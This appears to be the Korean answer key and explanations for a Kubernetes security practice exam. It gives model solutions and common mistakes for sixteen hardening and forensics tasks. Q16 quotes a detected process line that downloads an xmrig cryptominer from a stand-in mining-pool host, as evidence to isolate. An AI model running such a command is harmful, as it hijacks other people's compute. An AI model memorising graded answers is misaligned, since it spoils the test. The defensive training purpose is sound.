# 해설

제출 후 만점을 받지 못한 문항에만 아래 해설이 화면에 표시된다.
정답은 하나가 아니다 — 채점은 "결과가 규격대로인가"를 보므로, 아래는 가장 짧은 기준 답이다.

## Q1 NetworkPolicy — 기본 차단과 선별 허용

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: deny-all, namespace: prod }
spec:
  podSelector: {}
  policyTypes: ["Ingress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: allow-frontend, namespace: prod }
spec:
  podSelector: { matchLabels: { app: backend } }
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - podSelector: { matchLabels: { app: frontend } }
      ports:
        - { protocol: TCP, port: 80 }
```

자주 틀리는 곳

- `podSelector: {}` 를 빼먹으면 아무 파드도 선택되지 않는 게 아니라 **문법 오류**다. 빈 셀렉터가 "모든 파드"다.
- NetworkPolicy 는 **합집합**이다 — deny 정책이 있어도 allow 정책이 매치되는 트래픽은 통과한다.
- `from` 아래에서 `- podSelector` 와 `- namespaceSelector` 를 별개 항목으로 쓰면 OR, 한 항목에 같이 쓰면 AND 다.

## Q2 TLS Secret 과 TLS Ingress

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout web.key -out web.crt -subj "/CN=web.snacklab.local"
kubectl create secret tls web-cert -n prod --cert=web.crt --key=web.key
```

Ingress 는 `spec.tls` 에 `secretName: web-cert` 를 넣고, 규칙은 host
`web.snacklab.local`, path `/`(Prefix) → `web-svc:80` 으로 쓴다.

자주 틀리는 곳

- `kubectl create secret generic` 으로 만들면 타입이 `Opaque` 라 감점된다. **`create secret tls`** 여야 한다.
- `tls` 섹션 없이 규칙만 쓰면 TLS Ingress 가 아니다.

## Q3 플랫폼 바이너리 무결성 검증

```bash
cd ~/work/binaries && sha512sum -c checksums.txt
# kubelet: FAILED
echo kubelet > ~/answers/q3.txt
```

배포처가 공개한 체크섬과 하나라도 다르면 그 바이너리는 신뢰할 수 없다. 실제 시험에서도
`sha512sum`/`sha256sum -c` 대조가 그대로 나온다.

## Q4 RBAC 최소 권한으로 조이기

```bash
kubectl -n apps create role ci-role \
  --verb=get,list --resource=pods \
  --verb=get,list,update --resource=deployments.apps   # verbs 가 다르면 YAML 로
kubectl -n apps delete rolebinding ci-bot-rb
kubectl -n apps create rolebinding ci-bot-rb --role=ci-role --serviceaccount=apps:ci-bot
```

`create role` 은 리소스별 verb 분리가 안 되므로 YAML 로 rules 를 두 개 쓰는 것이 정확하다
(pods: get/list, deployments.apps: get/list/update).

자주 틀리는 곳

- RoleBinding 의 `roleRef` 는 **불변**이다 — ClusterRole/admin 에서 Role/ci-role 로 바꾸려면 지우고 다시 만들어야 한다.
- `--resource=deployments` 만 쓰면 core 그룹으로 잡힌다. `deployments.apps`.
- 채점은 `auth can-i` 결과다 — Secret 조회·파드 삭제가 여전히 되면 감점.

## Q5 ServiceAccount 토큰 자동 마운트 차단

```yaml
apiVersion: v1
kind: ServiceAccount
metadata: { name: web-sa, namespace: apps }
automountServiceAccountToken: false
```

```bash
kubectl -n apps patch deploy web -p '{"spec":{"template":{"spec":{"serviceAccountName":"web-sa"}}}}'
```

자주 틀리는 곳

- `automountServiceAccountToken` 은 SA 의 **최상위 필드**다(metadata 아님, spec 도 아님).
- SA 만 만들고 Deployment 에 연결하지 않으면 여전히 default SA 토큰이 마운트된다.
- 파드 스펙의 `automountServiceAccountToken: false` 로도 같은 효과를 낼 수 있다(채점은 결과만 본다).

## Q6 위험한 ClusterRoleBinding 제거

```bash
kubectl get clusterrolebindings \
  -o custom-columns='NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
  | grep cluster-admin
echo debug-admin-binding > ~/answers/q6.txt
kubectl delete clusterrolebinding debug-admin-binding
```

자주 틀리는 곳

- 기본 `cluster-admin` 바인딩(subject `system:masters`)은 클러스터 운영에 필요하다 — 지우면 감점.
- `system:authenticated` 에 온 권한을 주는 바인딩은 "인증만 되면 누구든 관리자"라는 뜻이다.

## Q7 seccomp RuntimeDefault 적용

```bash
kubectl -n sys-hard patch deploy runner -p \
  '{"spec":{"template":{"spec":{"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}}}}}}'
```

자주 틀리는 곳

- `seccompProfile` 은 **securityContext 안**이다. 파드 레벨에 두면 전 컨테이너에 적용된다.
- `type: Localhost` 는 프로파일 파일 경로(`localhostProfile`)가 필요하다. 여기서는 RuntimeDefault.

## Q8 호스트 접근 제거

`kubectl -n sys-hard edit deploy node-tool` 로 네 가지를 지운다:
`securityContext.privileged`, `hostPID`, `hostNetwork`, `volumes[].hostPath`(+`volumeMounts`).

자주 틀리는 곳

- hostPath 볼륨을 지우면 그것을 참조하는 **volumeMounts 도 같이** 지워야 한다. 남기면 스펙 오류로 롤아웃이 멈춘다.
- Deployment 를 삭제하고 새로 만드는 것보다 edit/patch 가 빠르고 안전하다.

## Q9 SecurityContext 로 컨테이너 강화

```yaml
containers:
  - name: app
    image: busybox:1.36
    command: ["sh", "-c", "sleep 86400"]
    securityContext:
      runAsNonRoot: true
      runAsUser: 10001
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
```

자주 틀리는 곳

- `allowPrivilegeEscalation`·`capabilities`·`readOnlyRootFilesystem` 은 **컨테이너 레벨 전용**이다.
- `runAsNonRoot: true` 만 있고 이미지가 root 기본이면 `CreateContainerConfigError` 가 난다 — `runAsUser` 를 같이 준다.

## Q10 Pod Security Admission — restricted 적용

```bash
kubectl label ns restricted-ns pod-security.kubernetes.io/enforce=restricted
```

그 다음 Deployment 를 restricted 에 맞게 고친다: `privileged` 제거,
파드 레벨 `runAsNonRoot: true`·`runAsUser`·`seccompProfile: {type: RuntimeDefault}`,
컨테이너 레벨 `allowPrivilegeEscalation: false`·`capabilities.drop: ["ALL"]`.

자주 틀리는 곳

- **라벨은 새 파드에만 적용된다.** 기존 privileged 파드는 계속 돈다 — Deployment 를 고쳐 롤아웃해야 한다.
- 롤아웃이 admission 에 막히면 `kubectl -n restricted-ns describe rs` 의 이벤트에 **무엇이 위반인지 그대로 적혀 있다.** 그걸 읽는 게 가장 빠르다.

## Q11 Secret 다루기

```bash
kubectl -n apps get secret db-creds -o jsonpath='{.data.password}' | base64 -d > ~/answers/q11.txt
kubectl -n apps create secret generic api-token --from-literal=token=cks-2026
```

파드는 `volumes[].secret.secretName: db-creds` + `volumeMounts` (`mountPath: /etc/creds`,
`readOnly: true`) 로 쓴다.

자주 틀리는 곳

- `-o jsonpath` 값은 **base64 인코딩** 상태다. 디코드 없이 그대로 적으면 오답.
- `echo` 로 파일에 쓸 때 따옴표 없이 `S3cr3t-CKS!` 를 쓰면 셸 히스토리 확장(`!`)에 걸릴 수 있다 — 작은따옴표로 감싼다.

## Q12 Dockerfile 보안 결함 수정

```dockerfile
FROM nginx:1.26
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
COPY index.html /usr/share/nginx/html/index.html
USER nginx
CMD ["nginx", "-g", "daemon off;"]
```

세 가지: `latest` → 태그 고정, `ENV API_KEY=…` 제거(크리덴셜은 이미지 레이어에 영구히 남는다),
`USER root` → 비루트 사용자. COPY·CMD 는 유지.

## Q13 취약 이미지 식별과 격리

리포트에서 CRITICAL 이 있는 것은 `frontend-app`(nginx:1.25, 2건)과 `report-app`(httpd:2.4, 1건)이다.
`batch-app`(busybox)은 LOW 뿐이므로 건드리지 않는다.

```bash
printf 'frontend-app\nreport-app\n' > ~/answers/q13.txt
kubectl -n supply scale deploy frontend-app report-app --replicas=0
```

실제 시험에서는 `trivy image --severity CRITICAL <이미지>` 를 직접 실행해 같은 판단을 한다.

## Q14 이미지 다이제스트 고정

```bash
kubectl -n supply get pod -l app=pinned \
  -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
# docker.io/library/nginx@sha256:abcd...
kubectl -n supply set image deploy/pinned web=nginx@sha256:abcd...
```

자주 틀리는 곳

- `nginx:1.26@sha256:…` 처럼 태그를 함께 써도 되지만, 다이제스트가 틀리면 ImagePullBackOff — 파드 Ready 채점에서 걸린다.
- 다이제스트는 임의 문자열이 아니라 **실제 존재하는 이미지의 것**이어야 한다.

## Q15 API 서버 감사 로깅

```yaml
# /var/lib/rancher/k3s/server/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets"]
  - level: None
```

```yaml
# /etc/rancher/k3s/config.yaml
kube-apiserver-arg:
  - audit-policy-file=/var/lib/rancher/k3s/server/audit-policy.yaml
  - audit-log-path=/var/lib/rancher/k3s/server/logs/audit.log
  - audit-log-maxage=7
  - audit-log-maxbackup=2
```

```bash
sudo mkdir -p /var/lib/rancher/k3s/server/logs
sudo systemctl restart k3s && kubectl get nodes   # 정상 확인 필수
```

자주 틀리는 곳

- 정책 파일 첫 규칙이 매치되면 **뒤 규칙은 평가되지 않는다** — `level: None` 을 맨 앞에 두면 아무것도 안 남는다.
- `rules` 가 비어 있으면 모든 요청이 기록되지 않는다. 규칙 순서: secrets → Metadata 먼저, 그 다음 None.
- 재시작 후 apiserver 가 안 뜨면 인자 오타다 — `sudo journalctl -u k3s | tail` 로 확인하고 config.yaml 을 고친다.

## Q16 런타임 포렌식

```bash
for p in $(kubectl -n runtime get pod -o name); do
  echo "== $p"; kubectl -n runtime exec ${p#pod/} -- ps
done
# logshipper 파드에서: wget ... http://pool.minexmr.example/xmrig ...
echo logshipper > ~/answers/q16.txt
kubectl -n runtime scale deploy logshipper --replicas=0
```

자주 틀리는 곳

- 워크로드 이름(`logshipper`)만 보면 무해해 보인다 — **프로세스 목록**이 근거다. 채굴풀 도메인·`xmrig` 가 흔적이다.
- 파드만 지우면 Deployment 가 다시 만든다. **replicas 0** 이 격리다.
- 무관한 `web`·`metrics` 까지 내리면 감점이다. 격리는 정확해야 한다.
